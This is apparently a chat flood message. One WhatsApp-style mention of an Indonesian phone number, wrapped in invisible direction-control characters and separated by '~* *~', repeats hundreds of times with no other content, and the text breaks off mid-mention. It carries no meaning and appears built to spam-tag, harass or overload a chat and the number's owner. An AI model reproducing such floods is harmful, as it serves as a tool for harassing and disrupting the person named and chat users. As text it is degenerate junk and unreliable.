895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~**~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~**~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 